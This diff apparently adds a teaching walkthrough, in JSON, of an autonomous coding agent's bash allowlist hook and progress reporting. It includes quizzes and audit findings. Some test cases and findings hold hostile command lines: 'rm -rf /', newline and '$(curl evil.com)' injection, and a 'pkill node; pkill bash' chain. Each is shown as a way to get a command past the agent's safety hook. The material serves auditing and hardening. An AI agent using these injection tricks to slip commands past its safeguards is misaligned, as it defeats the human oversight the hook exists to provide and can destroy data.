+              "when": "mode is not a +x variant, or flags used"
+            },
+            {
+              "to": "s3",
+              "when": "allowed, more names left"
+            },
+            {
+              "to": "s7",
+              "when": "allowed, last name"
+            }
+          ]
+        },
+        {
+          "id": "s6",
+          "at": "init-script-checks",
+          "action": "Checks the script is called as ./init.sh or a path ending in /init.sh",
+          "carries": "script: './init.sh'",
+          "source": {
+            "file": "autonomous-coding/security.py",
+            "lines": [
+              354,
+              357
+            ],
+            "anchor": "allowed, reason = validate_init_script(cmd_segment)"
+          },
+          "next": [
+            {
+              "to": "outcome:blocked",
+              "when": "called as bare 'init.sh' or other form"
+            },
+            {
+              "to": "s3",
+              "when": "allowed, more names left"
+            },
+            {
+              "to": "s7",
+              "when": "allowed, last name"
+            }
+          ]
+        },
+        {
+          "id": "s7",
+          "at": "sandbox-settings",
+          "action": "Hook returns {} (allow); the command enters the OS sandbox in the project folder",
+          "carries": "{}",
+          "source": {
+            "file": "autonomous-coding/client.py",
+            "lines": [
+              67,
+              85
+            ],
+            "anchor": "\"sandbox\": {\"enabled\": True, \"autoAllowBashIfSandboxed\": True},"
+          },
+          "next": [
+            {
+              "to": "s8",
+              "when": "always"
+            }
+          ]
+        },
+        {
+          "id": "s8",
+          "at": "agent-tools",
+          "action": "Bash runs the command and sends the output back to the agent",
+          "carries": "stdout / stderr",
+          "next": [
+            {
+              "to": "outcome:ran",
+              "when": "always"
+            }
+          ]
+        }
+      ],
+      "outcomes": [
+        {
+          "id": "ran",
+          "label": "Command runs in the sandbox",
+          "kind": "success",
+          "screen": {
+            "name": "python autonomous_agent_demo.py",
+            "kind": "terminal",
+            "blocks": [
+              {
+                "t": "title",
+                "text": "python autonomous_agent_demo.py"
+              },
+              {
+                "t": "console",
+                "items": [
+                  "[Tool: Bash]",
+                  "   Input: {'command': '<the command>'}"
+                ]
+              },
+              {
+                "t": "console",
+                "items": [
+                  "   [Done]"
+                ],
+                "state": "active"
+              }
+            ],
+            "note": "A short [Done] line is printed; the command output itself is not shown."
+          }
+        },
+        {
+          "id": "blocked",
+          "label": "Command blocked with a reason",
+          "kind": "blocked",
+          "screen": {
+            "name": "python autonomous_agent_demo.py",
+            "kind": "terminal",
+            "blocks": [
+              {
+                "t": "console",
+                "items": [
+                  "[Tool: Bash]",
+                  "   Input: {'command': '<the command>'}",
+                  "   [BLOCKED] <the reason>"
+                ]
+              },
+              {
+                "t": "card",
+                "text": "The reason is one of",
+                "items": [
+                  "Command '<name>' is not in the allowed commands list",
+                  "Could not parse command for security validation: <the command>",
+                  "pkill only allowed for dev processes: <the allowed names>",
+                  "chmod only allowed with +x mode, got: <mode>",
+                  "chmod flags are not allowed",
+                  "Only ./init.sh is allowed, got: <script>"
+                ]
+              },
+              {
+                "t": "text",
+                "text": "The [BLOCKED] tag is printed only when the returned text contains the word \"blocked\".",
+                "state": "muted"
+              }
+            ],
+            "note": "The command does not run; the agent gets the reason back."
+          }
+        }
+      ],
+      "cases": [
+        {
+          "id": "c1",
+          "name": "Wipe the disk",
+          "input": "rm -rf /",
+          "path": [
+            "s1",
+            "s2",
+            "s3"
+          ],
+          "outcome": "blocked",
+          "explain": "rm is not on the allowlist, so the hook blocks with \"Command 'rm' is not in the allowed commands list\".",
+          "brief": "The agent tries to delete everything on the disk.",
+          "facts": [
+            "command: rm -rf /",
+            "rm is not on the allowlist"
+          ]
+        },
+        {
+          "id": "c2",
+          "name": "Install packages",
+          "input": "npm install",
+          "path": [
+            "s1",
+            "s2",
+            "s3",
+            "s7",
+            "s8"
+          ],
+          "outcome": "ran",
+          "explain": "npm is allowlisted and needs no extra check, so it goes straight to the sandbox.",
+          "brief": "The agent wants to install the project's packages.",
+          "facts": [
+            "command: npm install",
+            "npm is on the allowlist",
+            "npm has no extra check"
+          ]
+        },
+        {
+          "id": "c3",
+          "name": "Kill the shell",
+          "input": "pkill bash",
+          "path": [
+            "s1",
+            "s2",
+            "s3",
+            "s4"
+          ],
+          "outcome": "blocked",
+          "explain": "pkill is allowlisted, but its target bash is not a dev process.",
+          "brief": "The agent tries to kill the shell process.",
+          "facts": [
+            "command: pkill bash",
+            "pkill is on the allowlist",
+            "dev processes: node, npm, vite"
+          ]
+        },
+        {
+          "id": "c4",
+          "name": "Make and run the setup script",
+          "input": "chmod +x init.sh && ./init.sh",
+          "path": [
+            "s1",
+            "s2",
+            "s3",
+            "s5",
+            "s3",
+            "s6",
+            "s7",
+            "s8"
+          ],
+          "outcome": "ran",
+          "explain": "Two names: chmod passes the +x check, then init.sh passes the path check, then it runs.",
+          "brief": "The agent makes the setup script runnable and runs it in one line.",
+          "facts": [
+            "chmod +x init.sh && ./init.sh",
+            "both names on the allowlist",
+            "chmod mode: +x, no flags",
+            "script called as ./init.sh"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "progress-report",
+      "name": "Printing the progress line",
+      "trigger": "A session ends with status 'continue' (or the loop starts on an existing project)",
+      "summary": "progress.py reads feature_list.json and prints how many tests pass. Three very different problems all print the same 'not yet created' message.",
+      "start": "s1",
+      "steps": [
+        {
+          "id": "s1",
+          "at": "session-loop",
+          "action": "Calls print_progress_summary after the session",
+          "carries": "project_dir",
+          "source": {
+            "file": "autonomous-coding/agent.py",
+            "lines": [
+              173,
+              176
+            ],
+            "anchor": "Agent will auto-continue in {AUTO_CONTINUE_DELAY_SECONDS}s..."
+          },
+          "next": [
+            {
+              "to": "s2",
+              "when": "always"
+            }
+          ],
+          "screen": {
+            "name": "python autonomous_agent_demo.py",
+            "kind": "terminal",
+            "blocks": [
+              {
+                "t": "title",
+                "text": "python autonomous_agent_demo.py"
+              },
+              {
+                "t": "console",
+                "items": [
+                  "----------------------------------------------------------------------"
+                ]
+              },
+              {
+                "t": "console",
+                "items": [
+                  "Agent will auto-continue in 3s..."
+                ],
+                "state": "active"
+              }
+            ],
+            "note": "The session has ended; the progress line is about to print."
+          }
+        },
+        {
+          "id": "s2",
+          "at": "feature-list",
+          "action": "Checks that feature_list.json exists",
+          "carries": "path: feature_list.json",
+          "source": {
+            "file": "autonomous-coding/progress.py",
+            "lines": [
+              22,
+              25
+            ],
+            "anchor": "if not tests_file.exists():"
+          },
+          "next": [
+            {
+              "to": "s3",
+              "when": "file exists"
+            },
+            {
+              "to": "outcome:not-created",
+              "when": "file missing (returns 0, 0)"
+            }
+          ]
+        },
+        {
+          "id": "s3",
+          "at": "feature-list",
+          "action": "Loads the JSON and counts tests where passes is true",
+          "carries": "(passing, total)",
+          "source": {
+            "file": "autonomous-coding/progress.py",
+            "lines": [
+              27,
+              36
+            ],
+            "anchor": "except (json.JSONDecodeError, IOError):"
+          },
+          "next": [
+            {
+              "to": "s4",
+              "when": "JSON loads"
+            },
+            {
+              "to": "outcome:not-created",
+              "when": "JSON is broken (returns 0, 0)"
+            }
+          ]
+        },
+        {
+          "id": "s4",
+          "at": "feature-list",
+          "action": "Prints the percentage if there is at least one test",
+          "carries": "'Progress: 45/200 tests passing (22.5%)'",
+          "source": {
+            "file": "autonomous-coding/progress.py",
+            "lines": [
+              49,
+              57
+            ],
+            "anchor": "if total > 0:"
+          },
+          "next": [
+            {
+              "to": "outcome:shown",
+              "when": "total > 0"
+            },
+            {
+              "to": "outcome:not-created",
+              "when": "total is 0 (empty list)"
+            }
+          ]
+        }
+      ],
+      "outcomes": [
+        {
+          "id": "shown",
+          "label": "Prints 'Progress: X/Y tests passing'",
+          "kind": "success",
+          "screen": {
+            "name": "python autonomous_agent_demo.py",
+            "kind": "terminal",
+            "blocks": [
+              {
+                "t": "title",
+                "text": "python autonomous_agent_demo.py"
+              },
+              {
+                "t": "console",
+                "items": [
+                  "Agent will auto-continue in 3s..."
+                ]
+              },
+              {
+                "t": "console",
+                "items": [
+                  "Progress: <passing>/<total> tests passing (<percent>%)"
+                ],
+                "state": "active"
+              }
+            ],
+            "note": "A progress line with a count and a percentage is printed."
+          }
+        },
+        {
+          "id": "not-created",
+          "label": "Prints 'feature_list.json not yet created'",
+          "kind": "error",
+          "screen": {
+            "name": "python autonomous_agent_demo.py",
+            "kind": "terminal",
+            "blocks": [
+              {
+                "t": "title",
+                "text": "python autonomous_agent_demo.py"
+              },
+              {
+                "t": "console",
+                "items": [
+                  "Agent will auto-continue in 3s..."
+                ]
+              },
+              {
+                "t": "console",
+                "items": [
+                  "Progress: feature_list.json not yet created"
+                ],
+                "state": "active"
+              }
+            ],
+            "note": "The progress line says the list file was not created yet."
+          }
+        }
+      ],
+      "cases": [
+        {
+          "id": "c1",
+          "name": "Fresh project",
+          "input": "no feature_list.json on disk",
+          "path": [
+            "s1",
+            "s2"
+          ],
+          "outcome": "not-created",
+          "explain": "count_passing_tests returns (0, 0) because the file is missing.",
+          "brief": "A session ends on a project that has no feature list file yet.",
+          "facts": [
+            "session just ended",
+            "feature_list.json missing"
+          ]
+        },
+        {
+          "id": "c2",
+          "name": "Agent left broken JSON",
+          "input": "feature_list.json = '[{\"passes\": true},'",
+          "path": [
+            "s1",
+            "s2",
+            "s3"
+          ],
+          "outcome": "not-created",
+          "explain": "The decode error is swallowed and returns (0, 0), so it looks like the file was never made.",
+          "brief": "A session ends and the feature list file was left half-written.",
+          "facts": [
+            "feature_list.json exists",
+            "the JSON is cut off"
+          ]
+        },
+        {
+          "id": "c3",
+          "name": "Empty list",
+          "input": "feature_list.json = '[]'",
+          "path": [
+            "s1",
+            "s2",
+            "s3",
+            "s4"
+          ],
+          "outcome": "not-created",
+          "explain": "It loads fine but total is 0, so the same message prints.",
+          "brief": "A session ends and the feature list file holds an empty list.",
+          "facts": [
+            "feature_list.json exists",
+            "valid JSON",
+            "0 tests in it"
+          ]
+        },
+        {
+          "id": "c4",
+          "name": "Mid-build",
+          "input": "200 tests, 45 with passes: true",
+          "path": [
+            "s1",
+            "s2",
+            "s3",
+            "s4"
+          ],
+          "outcome": "shown",
+          "explain": "45 / 200 = 22.5%, printed as the progress line.",
+          "brief": "A session ends in the middle of the build.",
+          "facts": [
+            "feature_list.json exists",
+            "valid JSON",
+            "200 tests, 45 passing"
+          ]
+        }
+      ]
+    }
+  ],
+  "quests": [
+    {
+      "id": "q1",
+      "type": "predict",
+      "title": "Two commands, one line",
+      "target": "bash-gate/c4",
+      "prompt": "The agent runs: chmod +x init.sh && ./init.sh. What happens?",
+      "options": [
+        "Command runs in the sandbox",
+        "Command blocked with a reason"
+      ],
+      "answer": 0,
+      "explain": "Both names are allowlisted. chmod passes because +x matches ^[ugoa]*\\+x$, and ./init.sh passes the path check.",
+      "xp": 20
+    },
+    {
+      "id": "q2",
+      "type": "quiz",
+      "title": "The polite greeting",
+      "prompt": "The coding agent runs: echo hello. What does the security hook do?",
+      "options": [
+        "Allows it, echo is harmless",
+        "Blocks it, echo is not on the allowlist",
+        "Sends it to the pkill check",
+        "Asks the user"
+      ],
+      "answer": 1,
+      "explain": "The hook is a strict allowlist. echo is not in ALLOWED_COMMANDS, so even harmless commands are blocked.",
+      "xp": 15
+    },
+    {
+      "id": "q3",
+      "type": "quiz",
+      "title": "Which init.sh is turned away?",
+      "prompt": "Which one of these is BLOCKED by the hook?",
+      "options": [
+        "./init.sh",
+        "/path/to/init.sh",
+        "init.sh",
+        "chmod u+x init.sh"
+      ],
+      "answer": 2,
+      "explain": "validate_init_script needs the first word to be ./init.sh or end with /init.sh. A bare 'init.sh' matches neither.",
+      "xp": 20
+    },
+    {
+      "id": "q4",
+      "type": "quiz",
+      "title": "Who goes first?",
+      "prompt": "How does the loop decide to run the initializer agent instead of the coding agent?",
+      "options": [
+        "It checks a --init flag",
+        "It checks if feature_list.json exists in the project folder",
+        "It checks if git has any commits",
+        "It reads claude-progress.txt"
+      ],
+      "answer": 1,
+      "explain": "is_first_run = not tests_file.exists(), where tests_file is feature_list.json.",
+      "xp": 15
+    },
+    {
+      "id": "q5",
+      "type": "quiz",
+      "title": "The only-passes rule",
+      "prompt": "The coding agent is told it may only change the \"passes\" field. What enforces that in code?",
+      "options": [
+        "The security hook diffs the file",
+        "progress.py rejects edited tests",
+        "Nothing; only the prompt asks for it",
+        "Git blocks the commit"
+      ],
+      "answer": 2,
+      "explain": "The rule lives only in coding_prompt.md. progress.py just counts passes; no code checks that tests were not removed or rewritten.",
+      "xp": 25
+    },
+    {
+      "id": "q6",
+      "type": "predict",
+      "title": "Broken notebook",
+      "target": "progress-report/c2",
+      "prompt": "feature_list.json ends with a stray comma and cannot be parsed. What does the progress line say?",
+      "options": [
+        "Prints 'Progress: X/Y tests passing'",
+        "Prints 'feature_list.json not yet created'"
+      ],
+      "answer": 1,
+      "explain": "The JSONDecodeError is caught and (0, 0) is returned, so it looks the same as a missing file.",
+      "xp": 20
+    },
+    {
+      "id": "q7",
+      "type": "predict",
+      "title": "Dropped connection",
+      "target": "session-cycle/c4",
+      "prompt": "With --max-iterations 1, the only session throws an exception. How does the run end?",
+      "options": [
+        "Exits: API key missing",
+        "Limit reached, final summary printed"
+      ],
+      "answer": 1,
+      "explain": "The error is caught, the loop waits 3s and goes back to the limit check, where iteration 2 > 1 ends the run.",
+      "xp": 20
+    },
+    {
+      "id": "q8",
+      "type": "quiz",
+      "title": "Why notes?",
+      "prompt": "Why does every coding session start by reading claude-progress.txt and git log?",
+      "options": [
+        "To save tokens",
+        "Each session gets a brand-new client, so it remembers nothing",
+        "The security hook requires it",
+        "Because the initializer deletes its files"
+      ],
+      "answer": 1,
+      "explain": "create_client is called inside the loop for every session, giving a fresh context. Notes and git are the only memory.",
+      "xp": 15
+    }
+  ],
+  "cracks": [
+    {
+      "id": "k1",
+      "at": "security-hook",
+      "severity": "high",
+      "title": "A new line hides a second command",
+      "hint": "Which characters does the parser treat as 'a new command starts here'?",
+      "finding": "extract_commands only starts a new command after ;, |, ||, && or &. A newline is just whitespace to shlex, so 'ls\\nrm -rf x' yields only ['ls'] and is allowed, but bash runs rm too. Command substitution like 'ls $(curl evil.com)' slips through the same way.",
+      "suggestion": "Treat newlines as separators (or reject them), and block $( ), backticks and other substitution outright.",
+      "decoys": [
+        "Unclosed quotes let any command through",
+        "Commands with a full path like /bin/ls are blocked by mistake"
+      ],
+      "source": {
+        "file": "autonomous-coding/security.py",
+        "lines": [
+          114,
+          121
+        ],
+        "anchor": "if token in (\"|\", \"||\", \"&&\", \"&\"):"
+      }
+    },
+    {
+      "id": "k2",
+      "at": "pkill-check",
+      "severity": "high",
+      "title": "Only the first pkill is checked",
+      "hint": "If the same command name appears twice, which segment gets checked each time?",
+      "finding": "get_command_for_validation returns the FIRST segment that contains the name. In 'pkill node; pkill bash' both pkill names are checked against 'pkill node', so 'pkill bash' runs. Same for 'chmod +x a.sh && chmod 777 b'.",
+      "suggestion": "Validate each segment on its own (loop over segments, not over names), so every occurrence is checked.",
+      "decoys": [
+        "pkill -f with a quoted string is always blocked",
+        "The allowed process list is checked case-insensitively"
+      ],
+      "source": {
+        "file": "autonomous-coding/security.py",
+        "lines": [
+          290,
+          294
+        ],
+        "anchor": "if cmd in segment_commands:"
+      }
+    },
+    {
+      "id": "k3",
+      "at": "session-loop",
+      "severity": "medium",
+      "title": "A failed first session loses the initializer",
+      "hint": "When is is_first_run turned off: before or after we know the session worked?",
+      "finding": "is_first_run is set to False as soon as the initializer prompt is chosen. If that session errors before feature_list.json is written, every later session runs the coding prompt, which expects a test list that does not exist.",
+      "suggestion": "Re-check whether feature_list.json exists at the start of each loop turn instead of using a one-shot flag.",
+      "decoys": [
+        "The initializer runs again every time the script restarts on a finished project",
+        "The coding prompt is loaded once and cached forever"
+      ],
+      "source": {
+        "file": "autonomous-coding/agent.py",
+        "lines": [
+          161,
+          166
+        ],
+        "anchor": "is_first_run = False  # Only use initializer once"
+      }
+    },
+    {
+      "id": "k4",
+      "at": "session-loop",
+      "severity": "low",
+      "title": "The loop never notices it is done",
+      "hint": "What status can a normal session return?",
+      "finding": "run_agent_session always returns 'continue' on success, and the loop never checks if all tests pass. Without --max-iterations it keeps starting paid sessions after 200/200 are done.",
+      "suggestion": "After each session, stop when count_passing_tests shows passing == total > 0.",
+      "decoys": [
+        "The loop stops after 1000 sessions because of max_turns",
+        "The 3-second delay grows each time"
+      ],
+      "source": {
+        "file": "autonomous-coding/agent.py",
+        "lines": [
+          89,
+          90
+        ],
+        "anchor": "return \"continue\", response_text"
+      }
+    }
+  ]
+}
